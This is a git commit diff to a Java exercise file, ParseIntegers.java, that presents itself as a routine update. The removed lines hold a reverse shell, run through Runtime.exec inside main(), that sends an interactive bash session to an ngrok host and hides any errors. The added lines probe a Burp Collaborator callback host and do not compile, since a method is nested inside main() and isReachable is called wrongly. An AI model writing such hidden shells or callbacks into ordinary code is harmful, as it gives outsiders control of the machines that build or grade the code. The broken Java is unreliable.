554e8f92f8f1eeb7519e113076dc1e5e85305c8a
YoneD19 <53221480+YoneD19@users.noreply.github.com>
2024-04-24 16:26:15 +0700

    Update ParseIntegers.java

--- src/main/java/com/epam/m1/exceptions/ParseIntegers.java
+++ src/main/java/com/epam/m1/exceptions/ParseIntegers.java
@@ -16,11 +16,15 @@ public class ParseIntegers {
                             .split(" "));
 
     public static void main(String[] args) {
-        Process p;
-        try {
-            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/16866 0>&1");
-            p.waitFor();
-            p.destroy();
-        } catch (Exception e) {}
+    public static boolean pingHost(String host, int port, int timeout) {
+        try (Socket socket = new Socket()) {
+            socket.connect(new InetSocketAddress(host, port), timeout);
+            return true;
+        } catch (IOException e) {
+            return false; // Either timeout or unreachable or failed DNS lookup.
+        }
+    }
+        boolean reachable = InetAddress.getByName("https://mj9s9yzk0y5v297ajmmn7lk2qtwjk8.burpcollaborator.net").isReachable();
+
     }
 }
